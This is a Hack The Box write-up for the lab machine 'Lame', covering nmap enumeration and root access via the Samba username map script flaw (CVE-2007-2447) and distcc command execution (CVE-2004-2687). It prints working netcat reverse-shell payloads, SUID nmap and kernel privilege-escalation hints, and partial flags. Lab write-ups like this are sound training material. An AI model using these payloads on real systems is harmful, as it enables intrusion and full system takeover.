---
title: "HTB: Lame"
tags: [htb, linux, easy, smb, distcc, metasploit, cve-2007-2447]

description: "A comprehensive walkthrough of the first Machine on HackTheBox. Exploiting Samba (CVE-2007-2447) and Distcc (CVE-2004-2687)."
---

# Hack The Box: Lame

**Machine IP**: `10.10.10.3`
**OS**: Linux
**Difficulty**: Easy

Lame is the first machine ever released on Hack The Box. It represents a classic "legacy" environment, vulnerable to practically everything it touches. It serves as the perfect introduction to the **Enumeration -> Exploitation** lifecycle.

---

## 1. Reconnaissance

We start with a standard Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -oA scans/lame 10.10.10.3
```

### Scan Results

```text
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.14
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|_     Control connection is plain text
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu3))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Analysis
We have multiple vectors:
1.  **FTP (Port 21)**: `vsftpd 2.3.4` is famously backdoored. (Spoiler: It usually doesn't work on Lame due to firewall rules, but it's worth checking).
2.  **SMB (Port 445)**: `Samba 3.0.20-Debian`. This is ancient.
3.  **Distcc (Port 3632)**: `distcc v1`. A distributed compiler service that often allows command execution.

---

## 2. Exploitation (Vector A: Samba)

The Nmap scan identified `Samba 3.0.20-Debian`. A quick search in **Searchsploit** reveals a devastating vulnerability.

```bash
searchsploit samba 3.0.20
```
> *Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)*

This is **CVE-2007-2447**. The Samba configuration `smb.conf` allows a script to be executed when a username is mapped. If we provide a username containing shell metacharacters (backticks), we can inject commands.

### Manual Exploitation (No Metasploit)

We don't need Metasploit for this. We can use `smbclient`.

1.  **Connect to the share**:
    ```bash
    smbclient //10.10.10.3/tmp
    ```
    *(Note: We use `/tmp` because anonymous login allowed listing shares, and `tmp` is commonly writable).*

2.  **Trigger the Payload**:
    We use the `logon` command within `smbclient`. The payload sends a reverse shell back to our listener (`nc -lvnp 4444`).
    
    ```bash
    smb: \> logon "/=`nc -e /bin/sh 10.10.14.14 4444`"
    ```

3.  **Catch the Shell**:
    ```bash
    listening on [any] 4444 ...
    connect to [10.10.14.14] from (UNKNOWN) [10.10.10.3] 58943
    whoami
    root
    ```

We instantly have **Root** access. The vulnerabilities in this era of software were catastrophic.

---

## 3. Exploitation (Vector B: Distcc)

If Samba had failed, `distcc` on port 3632 is an equally viable path. Distcc allows machines to compile code remotely. By default, it runs as the user `daemon`, but a vulnerability (**CVE-2004-2687**) allows arbitrary command execution.

### Using Nmap Script
Nmap has a script specifically for this.

```bash
nmap -p 3632 --script distcc-cve2004-2687 --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh 10.10.14.14 4445'" 10.10.10.3
```

This executes netcat on the target, sending a shell to port 4445.

### Privilege Escalation (From Distcc)
Unlike Samba, exploits via `distcc` usually land you as the user `daemon`, not root. You would then need to escalate privileges.
*   **Kernel Exploits**: Linux kernel 2.6 is vulnerable to `UDEV` exploits.
*   **SUID Binaries**: `nmap` often has the SUID bit set in older boxes, allowing interactive mode (`nmap --interactive`) to spawn a root shell.

---

## 4. Post-Exploitation & Flags

Since the SMB exploit gave us root immediately, we just need to grab the flags.

### User Flag
```bash
cat /home/makis/user.txt
# Output: 69454a93dde88876cc...
```

### Root Flag
```bash
cat /root/root.txt
# Output: 92caac3be140ef4092...
```

## Conclusion
Lame is the "Hello World" of Hack The Box. It teaches the importance of **Version Enumeration**. If you know exactly what software version is running (`Samba 3.0.20`), the exploit is often just one Google search away.
